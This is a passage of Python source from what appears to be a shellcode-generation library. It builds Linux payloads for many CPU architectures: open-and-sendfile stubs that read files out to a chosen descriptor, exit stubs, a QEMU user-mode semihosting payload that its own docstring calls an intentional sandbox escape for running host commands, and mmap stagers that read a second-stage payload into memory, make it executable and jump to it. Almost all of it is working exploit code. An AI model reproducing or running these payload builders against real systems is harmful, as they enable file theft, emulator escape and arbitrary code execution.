    output_fd: int,
    count: int,
    syscalls: _SendfileSyscalls,
) -> list[str]:
    suffix = ".w" if target.arch is Architecture.THUMB else ""
    lines = _arm_load("r12", stack.frame_size)
    lines.append(f"sub{suffix} sp, sp, r12")
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(
            (
                f"movw r12, #{value & 0xFFFF}",
                f"movt r12, #{value >> 16}",
                f"str{suffix} r12, [sp, #{offset}]",
            )
        )
    lines.extend(
        (
            f"add{suffix} r0, sp, #{stack.path_offset}",
            "eor r1, r1, r1",
            "eor r2, r2, r2",
            f"movw r7, #{syscalls.open_number}",
            "svc #0",
            "cmp r0, #0",
            "blt .Lsendfile_fail",
            "mov r4, r0",
            f"movw r0, #{output_fd}",
            "mov r1, r4",
            "eor r2, r2, r2",
        )
    )
    lines.extend(_arm_load("r3", count))
    lines.extend(
        (
            f"movw r7, #{syscalls.sendfile_number}",
            "svc #0",
            "cmp r0, #0",
            "blt .Lsendfile_fail",
            "eor r0, r0, r0",
            f"movw r7, #{syscalls.exit_number}",
            "svc #0",
            ".Lsendfile_fail:",
            "movw r0, #126",
            f"movw r7, #{syscalls.exit_number}",
            "svc #0",
        )
    )
    return lines


def _aarch64_sendfile_orw(
    target: Target,
    stack: _SendfileStack,
    output_fd: int,
    count: int,
    syscalls: _SendfileSyscalls,
) -> list[str]:
    lines = [f"sub sp, sp, #{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_aarch64_load("x9", value))
        lines.append(f"str x9, [sp, #{offset}]")
    lines.extend(
        (
            "movn x0, #99",
            f"add x1, sp, #{stack.path_offset}",
            "mov x2, xzr",
            "mov x3, xzr",
            f"mov x8, #{syscalls.open_number}",
            "svc #0",
            "cmp x0, #0",
            "b.lt .Lsendfile_fail",
            "mov x19, x0",
            f"mov x0, #{output_fd}",
            "mov x1, x19",
            "mov x2, xzr",
        )
    )
    lines.extend(_aarch64_load("x3", count))
    lines.extend(
        (
            f"mov x8, #{syscalls.sendfile_number}",
            "svc #0",
            "cmp x0, #0",
            "b.lt .Lsendfile_fail",
            "mov x0, xzr",
            f"mov x8, #{syscalls.exit_number}",
            "svc #0",
            ".Lsendfile_fail:",
            "mov x0, #126",
            f"mov x8, #{syscalls.exit_number}",
            "svc #0",
        )
    )
    return lines


def _mips_sendfile_orw(
    target: Target,
    stack: _SendfileStack,
    output_fd: int,
    count: int,
    syscalls: _SendfileSyscalls,
) -> list[str]:
    is_64 = target.arch is Architecture.MIPS64
    add = "daddiu" if is_64 else "addiu"
    load = "dli" if is_64 else "li"
    store = "sd" if is_64 else "sw"
    lines = [f"{add} $sp, $sp, -{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend((f"{load} $t0, 0x{value:x}", f"{store} $t0, {offset}($sp)"))
    lines.extend(
        (
            f"{add} $a0, $sp, {stack.path_offset}",
            f"{add} $a1, $zero, 0",
            f"{add} $a2, $zero, 0",
            f"{load} $v0, {syscalls.open_number}",
            "syscall",
            "bnez $a3, .Lsendfile_fail",
            "nop",
            "move $s0, $v0",
            f"{load} $a0, {output_fd}",
            "move $a1, $s0",
            f"{add} $a2, $zero, 0",
            f"{load} $a3, {count}",
            f"{load} $v0, {syscalls.sendfile_number}",
            "syscall",
            "bnez $a3, .Lsendfile_fail",
            "nop",
            f"{add} $a0, $zero, 0",
            f"{load} $v0, {syscalls.exit_number}",
            "syscall",
            "nop",
            ".Lsendfile_fail:",
            f"{add} $a0, $zero, 126",
            f"{load} $v0, {syscalls.exit_number}",
            "syscall",
            "nop",
        )
    )
    return lines


def _riscv_sendfile_orw(
    target: Target,
    stack: _SendfileStack,
    output_fd: int,
    count: int,
    syscalls: _SendfileSyscalls,
) -> list[str]:
    store = "sd" if target.arch is Architecture.RISCV64 else "sw"
    lines = [f"addi sp, sp, -{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend((f"li t0, 0x{value:x}", f"{store} t0, {offset}(sp)"))
    lines.extend(
        (
            "li a0, -100",
            f"addi a1, sp, {stack.path_offset}",
            "li a2, 0",
            "li a3, 0",
            f"li a7, {syscalls.open_number}",
            "ecall",
            "blt a0, zero, .Lsendfile_fail",
            "mv s0, a0",
            f"li a0, {output_fd}",
            "mv a1, s0",
            "li a2, 0",
            f"li a3, {count}",
            f"li a7, {syscalls.sendfile_number}",
            "ecall",
            "blt a0, zero, .Lsendfile_fail",
            "li a0, 0",
            f"li a7, {syscalls.exit_number}",
            "ecall",
            ".Lsendfile_fail:",
            "li a0, 126",
            f"li a7, {syscalls.exit_number}",
            "ecall",
        )
    )
    return lines


def _sparc_sendfile_orw(
    target: Target,
    stack: _SendfileStack,
    output_fd: int,
    count: int,
    syscalls: _SendfileSyscalls,
) -> list[str]:
    bias = _sparc_stack_bias(target)
    trap = _sparc_trap(target)
    store = "stx" if target.arch is Architecture.SPARC64 else "st"
    lines = [f"sub %sp, {stack.frame_size}, %sp"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_sparc_load_word(target, "%l0", value))
        lines.append(f"{store} %l0, [%sp + {bias + offset}]")
    lines.extend(
        (
            f"add %sp, {bias + stack.path_offset}, %o0",
            "clr %o1",
            "clr %o2",
            f"mov {syscalls.open_number}, %g1",
            f"ta {trap}",
            "bcs .Lsendfile_fail",
            "nop",
            "mov %o0, %l2",
        )
    )
    lines.extend(_sparc_load_word(target, "%o0", output_fd))
    lines.extend(
        (
            "mov %l2, %o1",
            "clr %o2",
        )
    )
    lines.extend(_sparc_load_word(target, "%o3", count))
    lines.extend(
        (
            f"mov {syscalls.sendfile_number}, %g1",
            f"ta {trap}",
            "bcs .Lsendfile_fail",
            "nop",
            "clr %o0",
            f"mov {syscalls.exit_number}, %g1",
            f"ta {trap}",
            ".Lsendfile_fail:",
            "mov 126, %o0",
            f"mov {syscalls.exit_number}, %g1",
            f"ta {trap}",
        )
    )
    return lines


def _s390_sendfile_orw(
    target: Target,
    stack: _SendfileStack,
    output_fd: int,
    count: int,
    syscalls: _SendfileSyscalls,
) -> list[str]:
    lines = [f"lay %r15, -{stack.frame_size}(%r15)"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_s390_load_word("%r0", value))
        lines.append(f"stg %r0, {offset}(%r15)")
    lines.extend(
        (
            f"la %r2, {stack.path_offset}(%r15)",
            "lghi %r3, 0",
            "lghi %r4, 0",
            f"lghi %r1, {syscalls.open_number}",
            "svc 0",
            "ltgr %r2, %r2",
            "jl .Lsendfile_fail",
            "lgr %r8, %r2",
            f"llilf %r2, {output_fd}",
            "lgr %r3, %r8",
            "lghi %r4, 0",
        )
    )
    lines.extend(_s390_load_word("%r5", count))
    lines.extend(
        (
            f"lghi %r1, {syscalls.sendfile_number}",
            "svc 0",
            "ltgr %r2, %r2",
            "jl .Lsendfile_fail",
            "lghi %r2, 0",
            f"lghi %r1, {syscalls.exit_number}",
            "svc 0",
            ".Lsendfile_fail:",
            "lghi %r2, 126",
            f"lghi %r1, {syscalls.exit_number}",
            "svc 0",
        )
    )
    return lines


def _powerpc_sendfile_orw(
    target: Target,
    stack: _SendfileStack,
    output_fd: int,
    count: int,
    syscalls: _SendfileSyscalls,
) -> list[str]:
    store = "std" if target.arch is Architecture.POWERPC64 else "stw"
    lines = [f"addi 1, 1, -{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_powerpc_load_word(target, 9, value))
        lines.append(f"{store} 9, {offset}(1)")
    lines.extend(
        (
            f"addi 3, 1, {stack.path_offset}",
            "li 4, 0",
            "li 5, 0",
            f"li 0, {syscalls.open_number}",
            "sc",
            "bso .Lsendfile_fail",
            "mr 14, 3",
        )
    )
    lines.extend(_powerpc_load_word(target, 3, output_fd))
    lines.extend(("mr 4, 14", "li 5, 0"))
    lines.extend(_powerpc_load_word(target, 6, count))
    lines.extend(
        (
            f"li 0, {syscalls.sendfile_number}",
            "sc",
            "bso .Lsendfile_fail",
            "li 3, 0",
            f"li 0, {syscalls.exit_number}",
            "sc",
            ".Lsendfile_fail:",
            "li 3, 126",
            f"li 0, {syscalls.exit_number}",
            "sc",
        )
    )
    return lines


def exit_source(status: int, target: Target) -> str:
    """Lower a Linux ``exit(status)`` shellcode stub."""

    if not 0 <= status <= 255:
        raise ValueError("exit status must be in the range 0..255")
    lines = _header(target)
    if target.arch is Architecture.X86:
        lines.extend((f"mov ebx, {status}", "mov eax, 1", "int 0x80"))
    elif target.arch is Architecture.X86_64:
        lines.extend((f"mov edi, {status}", "mov eax, 60", "syscall"))
    elif target.arch in {Architecture.ARM, Architecture.THUMB}:
        lines.extend((f"movw r0, #{status}", "movw r7, #1", "svc #0"))
    elif target.arch is Architecture.ARM64:
        lines.extend((f"mov x0, #{status}", "mov x8, #93", "svc #0"))
    elif target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
        is_64 = target.arch is Architecture.MIPS64
        add = "daddiu" if is_64 else "addiu"
        load = "dli" if is_64 else "li"
        number = 5058 if is_64 else 4001
        lines.extend((f"{add} $a0, $zero, {status}", f"{load} $v0, {number}", "syscall", "nop"))
    elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
        lines.extend((f"li a0, {status}", "li a7, 93", "ecall"))
    elif target.arch in {Architecture.SPARC32, Architecture.SPARC64}:
        lines.extend((f"mov {status}, %o0", "mov 1, %g1", f"ta {_sparc_trap(target)}"))
    elif target.arch is Architecture.S390X:
        lines.extend((f"lghi %r2, {status}", "lghi %r1, 1", "svc 0"))
    elif target.arch in {Architecture.POWERPC32, Architecture.POWERPC64}:
        lines.extend(_powerpc_load_word(target, 3, status))
        lines.extend(("li 0, 1", "sc"))
    else:
        raise UnsupportedTargetError(f"exit shellcode is not implemented for {target.name}")
    return "\n".join(lines) + "\n"


def exit_shellcode(status: int, target: Target, *, assembler: Assembler | None = None) -> Payload:
    """Build a minimal target-native Linux exit payload."""

    source = exit_source(status, target)
    data = (assembler or ZigAssembler()).assemble(source, target)
    return Payload(
        data=data,
        target=target,
        kind=PayloadKind.SHELLCODE,
        description=f"exit({status}) shellcode",
        memory=(
            MemoryRequirement(
                len(data),
                Permission.READ | Permission.EXECUTE,
                "shellcode bytes",
                alignment=_instruction_alignment(target),
            ),
        ),
        data_requirement_index=0,
        metadata={
            "operation": "exit",
            "status": status,
            "position_independent": True,
            "requires_instruction_cache_sync_after_runtime_write": _requires_instruction_cache_sync(target),
            "assembly": source,
        },
    )


def _arm_load(register: str, value: int) -> list[str]:
    value &= 0xFFFFFFFF
    return [f"movw {register}, #{value & 0xFFFF}", f"movt {register}, #{value >> 16}"]


def _arm_qemu_semihosting(target: Target, stack: _QemuSemihostingStack) -> list[str]:
    suffix = ".w" if target.arch is Architecture.THUMB else ""
    lines = _arm_load("r3", stack.frame_size)
    lines.append(f"sub{suffix} sp, sp, r3")
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(
            (
                f"movw r12, #{value & 0xFFFF}",
                f"movt r12, #{value >> 16}",
                f"str{suffix} r12, [sp, #{offset}]",
            )
        )
    lines.extend(
        (
            f"add{suffix} r2, sp, #{stack.command_offset}",
            f"str{suffix} r2, [sp, #{stack.arguments_offset}]",
            "movw r0, #0x12",
        )
    )
    lines.extend(_arm_load("r1", stack.arguments_offset))
    lines.extend(
        (
            f"add{suffix} r1, sp, r1",
            "svc #0xab" if target.arch is Architecture.THUMB else "svc #0x123456",
            "eor r0, r0, r0",
            "movw r7, #1",
            "svc #0",
        )
    )
    return lines


def _aarch64_qemu_semihosting(target: Target, stack: _QemuSemihostingStack) -> list[str]:
    lines = [f"sub sp, sp, #{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_aarch64_load("x9", value))
        lines.append(f"str x9, [sp, #{offset}]")
    lines.extend(
        (
            f"add x9, sp, #{stack.command_offset}",
            f"str x9, [sp, #{stack.arguments_offset}]",
            "mov x0, #0x12",
            f"add x1, sp, #{stack.arguments_offset}",
            "hlt #0xf000",
            "mov x0, xzr",
            "mov x8, #93",
            "svc #0",
        )
    )
    return lines


def _riscv_qemu_semihosting(target: Target, stack: _QemuSemihostingStack) -> list[str]:
    store = "sd" if target.arch is Architecture.RISCV64 else "sw"
    lines = [f"addi sp, sp, -{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend((f"li t0, 0x{value:x}", f"{store} t0, {offset}(sp)"))
    lines.extend(
        (
            f"addi t1, sp, {stack.command_offset}",
            f"{store} t1, {stack.arguments_offset}(sp)",
            "li a0, 0x12",
            f"addi a1, sp, {stack.arguments_offset}",
            ".balign 16",
            "slli zero, zero, 0x1f",
            "ebreak",
            "srai zero, zero, 0x7",
            "li a0, 0",
            "li a7, 93",
            "ecall",
        )
    )
    return lines


def qemu_semihosting_command_source(command: str | bytes, target: Target) -> tuple[str, int]:
    """Lower a host ``SYS_SYSTEM`` escape for automatic QEMU user-mode semihosting."""

    supported = {
        Architecture.ARM,
        Architecture.THUMB,
        Architecture.ARM64,
        Architecture.RISCV32,
        Architecture.RISCV64,
    }
    if target.arch not in supported:
        raise UnsupportedTargetError(f"automatic QEMU user-mode semihosting is not implemented for {target.name}")

    stack = _qemu_semihosting_stack(target, command)
    lines = _header(target)
    if target.arch in {Architecture.ARM, Architecture.THUMB}:
        lines.extend(_arm_qemu_semihosting(target, stack))
    elif target.arch is Architecture.ARM64:
        lines.extend(_aarch64_qemu_semihosting(target, stack))
    else:
        lines.extend(_riscv_qemu_semihosting(target, stack))
    return "\n".join(lines) + "\n", stack.frame_size


def qemu_semihosting_command_shellcode(
    command: str | bytes,
    target: Target,
    *,
    assembler: Assembler | None = None,
) -> Payload:
    """Build shellcode that runs a command on the QEMU user-mode host.

    Supported qemu-user targets intercept the architecture's semihosting trap
    automatically.  Consequently this is an intentional sandbox escape, not a
    guest Linux command payload.  The command must be trusted.
    """

    source, stack_size = qemu_semihosting_command_source(command, target)
    data = (assembler or ZigAssembler()).assemble(source, target)
    riscv_signature = target.arch in {Architecture.RISCV32, Architecture.RISCV64}
    code_alignment = 16 if riscv_signature else _instruction_alignment(target)
    return Payload(
        data=data,
        target=target,
        kind=PayloadKind.SHELLCODE,
        description="QEMU user-mode semihosting SYS_SYSTEM host-command escape",
        memory=(
            MemoryRequirement(
                len(data),
                Permission.READ | Permission.EXECUTE,
                "semihosting shellcode bytes",
                alignment=code_alignment,
            ),
            MemoryRequirement(
                stack_size,
                Permission.READ | Permission.WRITE,
                "temporary semihosting command and argument block",
                alignment=target.convention.stack_alignment,
            ),
        ),
        data_requirement_index=0,
        metadata={
            "operation": "qemu-user-semihosting-system",
            "semihosting_call": "SYS_SYSTEM",
            "semihosting_operation_number": 0x12,
            "command_executes_on_host": True,
            "qemu_user_automatic_interception": True,
            "semihosting_trap_same_page_required": riscv_signature,
            "trusted_command_required": True,
            "position_independent": True,
            "requires_instruction_cache_sync_after_runtime_write": _requires_instruction_cache_sync(target),
            "assembly": source,
        },
    )


def _x86_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
    if target.arch is Architecture.X86_64:
        return [
            "xor edi, edi",
            f"mov esi, {map_size}",
            "mov edx, 3",
            "mov r10d, 0x22",
            "mov r8, -1",
            "xor r9d, r9d",
            "mov eax, 9",
            "syscall",
            "cmp rax, -4095",
            "jae .Lstage_fail",
            "mov r12, rax",
            "mov r13, rax",
            f"mov r14, {size}",
            ".Lstage_read:",
            f"mov edi, {input_fd}",
            "mov rsi, r13",
            "mov rdx, r14",
            "xor eax, eax",
            "syscall",
            "test rax, rax",
            "jle .Lstage_fail",
            "add r13, rax",
            "sub r14, rax",
            "jne .Lstage_read",
            "mov rdi, r12",
            f"mov esi, {map_size}",
            "mov edx, 5",
            "mov eax, 10",
            "syscall",
            "test rax, rax",
            "js .Lstage_fail",
            "jmp r12",
            ".Lstage_fail:",
            "mov edi, 125",
            "mov eax, 60",
            "syscall",
        ]
    return [
        "xor ebx, ebx",
        f"mov ecx, {map_size}",
        "mov edx, 3",
        "mov esi, 0x22",
        "mov edi, -1",
        "xor ebp, ebp",
        "mov eax, 192",
        "int 0x80",
        "cmp eax, 0xfffff001",
        "jae .Lstage_fail",
        "mov esi, eax",
        "mov edi, eax",
        f"mov ebp, {size}",
        ".Lstage_read:",
        f"mov ebx, {input_fd}",
        "mov ecx, edi",
        "mov edx, ebp",
        "mov eax, 3",
        "int 0x80",
        "test eax, eax",
        "jle .Lstage_fail",
        "add edi, eax",
        "sub ebp, eax",
        "jne .Lstage_read",
        "mov ebx, esi",
        f"mov ecx, {map_size}",
        "mov edx, 5",
        "mov eax, 125",
        "int 0x80",
        "test eax, eax",
        "js .Lstage_fail",
        "jmp esi",
        ".Lstage_fail:",
        "mov ebx, 125",
        "mov eax, 1",
        "int 0x80",
    ]


def _arm_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
    suffix = ".w" if target.arch is Architecture.THUMB else ""
    lines = ["eor r0, r0, r0"]
    lines.extend(_arm_load("r1", map_size))
    lines.extend(("movw r2, #3", "movw r3, #0x22"))
    lines.extend(_arm_load("r4", -1))
    lines.extend(("eor r5, r5, r5", "movw r7, #192", "svc #0", "cmp r0, #0", "blt .Lstage_fail"))
    lines.extend(("mov r4, r0", "mov r5, r0"))
    lines.extend(_arm_load("r6", size))
    lines.extend(_arm_load("r8", size))
    lines.extend(
        (
            ".Lstage_read:",
            f"movw r0, #{input_fd}",
            "mov r1, r5",
            "mov r2, r6",
            "movw r7, #3",
            "svc #0",
            "cmp r0, #0",
            "ble .Lstage_fail",
            f"add{suffix} r5, r5, r0",
            f"sub{suffix} r6, r6, r0",
            "cmp r6, #0",
            "bne .Lstage_read",
            "mov r0, r4",
        )
    )
    lines.extend(_arm_load("r1", map_size))
    lines.extend(("movw r2, #5", "movw r7, #125", "svc #0", "cmp r0, #0", "blt .Lstage_fail"))
    lines.extend(
        (
            "mov r0, r4",
            f"add{suffix} r1, r4, r8",
            "eor r2, r2, r2",
            "movw r7, #2",
            "movt r7, #15",
            "svc #0",
        )
    )
    if target.arch is Architecture.THUMB:
        lines.append("orr.w r4, r4, #1")
    lines.extend(
        (
            "bx r4",
            ".Lstage_fail:",
            "movw r0, #125",
            "movw r7, #1",
            "svc #0",
        )
    )
    return lines


def _aarch64_stager(size: int, map_size: int, input_fd: int) -> list[str]:
    lines = ["mov x0, xzr"]
    lines.extend(_aarch64_load("x1", map_size))
    lines.extend(("mov x2, #3", "mov x3, #0x22", "movn x4, #0", "mov x5, xzr", "mov x8, #222", "svc #0"))
    lines.extend(("cmp x0, #0", "b.lt .Lstage_fail", "mov x19, x0", "mov x20, x0"))
    lines.extend(_aarch64_load("x21", size))
    lines.extend(_aarch64_load("x22", size))
    lines.extend(
        (
            ".Lstage_read:",
            f"mov x0, #{input_fd}",
            "mov x1, x20",
            "mov x2, x21",
            "mov x8, #63",
            "svc #0",
            "cmp x0, #0",
            "b.le .Lstage_fail",
            "add x20, x20, x0",
            "sub x21, x21, x0",
            "cbnz x21, .Lstage_read",
            "mov x0, x19",
        )
    )
    lines.extend(_aarch64_load("x1", map_size))
    lines.extend(
        (
            "mov x2, #5",
            "mov x8, #226",
            "svc #0",
            "cmp x0, #0",
            "b.lt .Lstage_fail",
            "mrs x9, ctr_el0",
            "ubfx x10, x9, #16, #4",
            "mov x11, #4",
            "lsl x10, x11, x10",
            "sub x11, x10, #1",
            "bic x12, x19, x11",
            "add x13, x19, x22",
            ".Lstage_dc:",
            "dc cvau, x12",
            "add x12, x12, x10",
            "cmp x12, x13",
            "b.lo .Lstage_dc",
            "dsb ish",
            "and x10, x9, #0xf",
            "mov x11, #4",
            "lsl x10, x11, x10",
            "sub x11, x10, #1",
            "bic x12, x19, x11",
            ".Lstage_ic:",
            "ic ivau, x12",
            "add x12, x12, x10",
            "cmp x12, x13",
            "b.lo .Lstage_ic",
            "dsb ish",
            "isb",
            "br x19",
            ".Lstage_fail:",
            "mov x0, #125",
            "mov x8, #93",
            "svc #0",
        )
    )
    return lines


def _mips_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
    is_64 = target.arch is Architecture.MIPS64
    add_immediate = "daddiu" if is_64 else "addiu"
    add_register = "daddu" if is_64 else "addu"
    subtract = "dsubu" if is_64 else "subu"
    load = "dli" if is_64 else "li"
    mmap_number = 5009 if is_64 else 4210
    read_number = 5000 if is_64 else 4003
    mprotect_number = 5010 if is_64 else 4125
    cacheflush_number = 5197 if is_64 else 4147
    exit_number = 5058 if is_64 else 4001
    flags = 0x802
    lines: list[str] = []
    if not is_64:
        lines.extend(("addiu $sp, $sp, -32", "li $t0, -1", "sw $t0, 16($sp)", "sw $zero, 20($sp)"))
    lines.extend(
        (
            f"{add_immediate} $a0, $zero, 0",
            f"{load} $a1, {map_size}",
            f"{load} $a2, 3",
            f"{load} $a3, {flags}",
        )
    )
    if is_64:
        lines.extend((f"{load} $a4, -1", f"{add_immediate} $a5, $zero, 0"))
    lines.extend((f"{load} $v0, {mmap_number}", "syscall", "bnez $a3, .Lstage_fail", "nop"))
    lines.extend(("move $s0, $v0", "move $s1, $v0", f"{load} $s2, {size}", ".Lstage_read:"))
    lines.extend(
        (
            f"{load} $a0, {input_fd}",
            "move $a1, $s1",
            "move $a2, $s2",
            f"{load} $v0, {read_number}",
            "syscall",
            "bnez $a3, .Lstage_fail",
            "nop",
            "blez $v0, .Lstage_fail",
            "nop",
            f"{add_register} $s1, $s1, $v0",
            f"{subtract} $s2, $s2, $v0",
            "bnez $s2, .Lstage_read",
            "nop",
            "move $a0, $s0",
            f"{load} $a1, {map_size}",
            f"{load} $a2, 5",
            f"{load} $v0, {mprotect_number}",
            "syscall",
            "bnez $a3, .Lstage_fail",
            "nop",
            "move $a0, $s0",
            f"{load} $a1, {size}",
            f"{load} $a2, 3",
            f"{load} $v0, {cacheflush_number}",
            "syscall",
            "bnez $a3, .Lstage_fail",
            "nop",
            "jr $s0",
            "nop",
            ".Lstage_fail:",
            f"{load} $a0, 125",
            f"{load} $v0, {exit_number}",
            "syscall",
            "nop",
        )
    )
    return lines


def _riscv_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
    return [
        "li a0, 0",
        f"li a1, {map_size}",
        "li a2, 3",
        "li a3, 0x22",
        "li a4, -1",
        "li a5, 0",
        "li a7, 222",
        "ecall",
        "blt a0, zero, .Lstage_fail",
        "mv s0, a0",
        "mv s1, a0",
        f"li s2, {size}",
        ".Lstage_read:",
        f"li a0, {input_fd}",
        "mv a1, s1",
        "mv a2, s2",
        "li a7, 63",
        "ecall",
        "bge zero, a0, .Lstage_fail",
        "add s1, s1, a0",
        "sub s2, s2, a0",
        "bnez s2, .Lstage_read",
        "mv a0, s0",
        f"li a1, {map_size}",
        "li a2, 5",
        "li a7, 226",
        "ecall",
        "blt a0, zero, .Lstage_fail",
        "fence.i",
        "jr s0",
        ".Lstage_fail:",
        "li a0, 125",
        "li a7, 93",
        "ecall",
    ]


def _sparc_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
    trap = _sparc_trap(target)
    flush_count = _align(size, 8) // 8
    lines = [
        "clr %o0",
    ]
    lines.extend(_sparc_load_word(target, "%o1", map_size))
    lines.extend(
        (
            "mov 3, %o2",
            "mov 0x22, %o3",
            "mov -1, %o4",
            "clr %o5",
            "mov 71, %g1",
            f"ta {trap}",
            "bcs .Lstage_fail",
            "nop",
            "mov %o0, %l0",
            "mov %o0, %l1",
        )
    )
    lines.extend(_sparc_load_word(target, "%l2", size))
    lines.extend((".Lstage_read:",))
    lines.extend(_sparc_load_word(target, "%o0", input_fd))
    lines.extend(
        (
            "mov %l1, %o1",
            "mov %l2, %o2",
            "mov 3, %g1",
            f"ta {trap}",
            "bcs .Lstage_fail",
            "nop",
            "cmp %o0, 0",
            "ble .Lstage_fail",
            "nop",
            "add %l1, %o0, %l1",
            "sub %l2, %o0, %l2",
            "cmp %l2, 0",
            "bne .Lstage_read",
            "nop",
            "mov %l0, %o0",
        )
    )
    lines.extend(_sparc_load_word(target, "%o1", map_size))
    lines.extend(
        (
            "mov 5, %o2",
            "mov 74, %g1",
            f"ta {trap}",
            "bcs .Lstage_fail",
            "nop",
            "mov %l0, %l1",
        )
    )
    lines.extend(_sparc_load_word(target, "%l2", flush_count))
    lines.extend(
        (
            ".Lstage_flush:",
            "flush %l1",
            "add %l1, 8, %l1",
            "subcc %l2, 1, %l2",
            "bne .Lstage_flush",
            "nop",
            "membar #Sync" if target.arch is Architecture.SPARC64 else "stbar",
            "jmp %l0",
            "nop",
            ".Lstage_fail:",
            "mov 125, %o0",
            "mov 1, %g1",
            f"ta {trap}",
        )
    )
    return lines


def _s390_stager(size: int, map_size: int, input_fd: int) -> list[str]:
    # Linux s390x retains sys_old_mmap: r2 points at six unsigned-long
    # arguments rather than carrying them directly in r2..r7.
    lines = [
        "lay %r15, -48(%r15)",
        "lghi %r0, 0",
        "stg %r0, 0(%r15)",
    ]
    lines.extend(_s390_load_word("%r0", map_size))
    lines.extend(
        (
            "stg %r0, 8(%r15)",
            "lghi %r0, 3",
            "stg %r0, 16(%r15)",
            "lghi %r0, 0x22",
            "stg %r0, 24(%r15)",
            "lghi %r0, -1",
            "stg %r0, 32(%r15)",
            "lghi %r0, 0",
            "stg %r0, 40(%r15)",
            "la %r2, 0(%r15)",
            "lghi %r1, 90",
            "svc 0",
            "ltgr %r2, %r2",
            "jl .Lstage_fail",
            "lgr %r8, %r2",
            "lgr %r9, %r2",
            f"llilf %r10, {size}",
            ".Lstage_read:",
            f"llilf %r2, {input_fd}",
            "lgr %r3, %r9",
            "lgr %r4, %r10",
            "lghi %r1, 3",
            "svc 0",
            "ltgr %r2, %r2",
            "jle .Lstage_fail",
            "agr %r9, %r2",
            "sgr %r10, %r2",
            "ltgr %r10, %r10",
            "jne .Lstage_read",
            "lgr %r2, %r8",
        )
    )
    lines.extend(_s390_load_word("%r3", map_size))
    lines.extend(
        (
            "lghi %r4, 5",
            "lghi %r1, 125",
            "svc 0",
            "ltgr %r2, %r2",
            "jl .Lstage_fail",
            "bcr 15, 0",
            "br %r8",
            ".Lstage_fail:",
            "lghi %r2, 125",
            "lghi %r1, 1",
            "svc 0",
        )
    )
    return lines


def _powerpc_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
    compare = "cmpdi" if target.arch is Architecture.POWERPC64 else "cmpwi"
    lines: list[str] = []
    for register, value in ((3, 0), (4, map_size), (5, 3), (6, 0x22), (7, -1), (8, 0), (0, 90)):
        lines.extend(_powerpc_load_word(target, register, value))
    lines.extend(
        (
            "sc",
            "bso .Lstage_fail",
            "mr 14, 3",
            "mr 15, 3",
        )
    )
    lines.extend(_powerpc_load_word(target, 16, size))
    lines.extend(_powerpc_load_word(target, 17, size))
    lines.append(".Lstage_read:")
    lines.extend(_powerpc_load_word(target, 3, input_fd))
    lines.extend(
        (
            "mr 4, 15",
            "mr 5, 16",
            "li 0, 3",
            "sc",
            "bso .Lstage_fail",
            f"{compare} 3, 0",
            "ble .Lstage_fail",
            "add 15, 15, 3",
            "subf 16, 3, 16",
            f"{compare} 16, 0",
            "bne .Lstage_read",
            "mr 3, 14",
        )
    )
    lines.extend(_powerpc_load_word(target, 4, map_size))
    lines.extend(
        (
            "li 5, 5",
            "li 0, 125",
            "sc",
            "bso .Lstage_fail",
            "mr 18, 14",
            "mr 19, 17",
            ".Lstage_dc:",
            "dcbst 0, 18",
            "addi 18, 18, 4",
            "addi 19, 19, -4",
            f"{compare} 19, 0",
            "bgt .Lstage_dc",
            "sync",
            "mr 18, 14",
            "mr 19, 17",
            ".Lstage_ic:",
            "icbi 0, 18",
            "addi 18, 18, 4",
            "addi 19, 19, -4",
            f"{compare} 19, 0",
            "bgt .Lstage_ic",
            "sync",
            "isync",
            "mtctr 14",
            "bctr",
            ".Lstage_fail:",
            "li 3, 125",
            "li 0, 1",
            "sc",
        )
    )
    return lines


def mmap_stager_source(
    size: int,
    target: Target,
    *,
    input_fd: int = 0,
    page_size: int = 0x1000,
) -> tuple[str, int]:
    """Lower an exact-read, RW-to-RX ``mmap`` stager.

    The stage is read completely, the mapping is changed from ``RW`` to
    ``RX``, and non-coherent instruction caches are finalized before control
    transfers.  A page size is an explicit runtime input because it is not
    fixed by architecture alone.
    """

    if size <= 0 or size > 0x7FFFFFFF:
        raise ValueError("stage size must be in the range 1..0x7fffffff")
    if not 0 <= input_fd <= 0xFFFF:
        raise ValueError("input_fd must be in the range 0..65535")
    if page_size <= 0 or page_size & (page_size - 1):
        raise ValueError("page_size must be a positive power of two")
    map_size = _align(size, page_size)
    if map_size > target.mask:
        raise ValueError(f"mapping size does not fit {target.bits}-bit target")
    lines = _header(target)
    if target.arch in {Architecture.X86, Architecture.X86_64}:
        lines.extend(_x86_stager(target, size, map_size, input_fd))
    elif target.arch in {Architecture.ARM, Architecture.THUMB}:
        lines.extend(_arm_stager(target, size, map_size, input_fd))
    elif target.arch is Architecture.ARM64:
        lines.extend(_aarch64_stager(size, map_size, input_fd))
    elif target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
        lines.extend(_mips_stager(target, size, map_size, input_fd))
    elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
        lines.extend(_riscv_stager(target, size, map_size, input_fd))
    elif target.arch in {Architecture.SPARC32, Architecture.SPARC64}:
        lines.extend(_sparc_stager(target, size, map_size, input_fd))
    elif target.arch is Architecture.S390X:
        lines.extend(_s390_stager(size, map_size, input_fd))
    elif target.arch in {Architecture.POWERPC32, Architecture.POWERPC64}:
        lines.extend(_powerpc_stager(target, size, map_size, input_fd))
    else:
        raise UnsupportedTargetError(f"mmap stager is not implemented for {target.name}")
    return "\n".join(lines) + "\n", map_size


def mmap_stager(
    size: int,
    target: Target,
    *,
